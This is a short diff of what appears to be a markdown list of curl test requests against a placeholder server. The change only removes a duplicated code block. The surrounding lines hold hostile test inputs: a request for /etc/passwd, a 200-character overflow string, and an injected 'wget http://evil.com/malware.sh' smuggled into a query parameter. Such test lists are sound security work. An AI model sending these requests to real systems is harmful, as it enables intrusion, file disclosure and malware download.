@@ -38,9 +38,6 @@ curl http://[ip address]:[port]/etc/passwd
 curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")
 ```
 ```bash
-curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")
-```
-```bash
 curl "http://[ip address]:[port]/?input=hello%3Bwget%20http://evil.com/malware.sh"
 ```
 
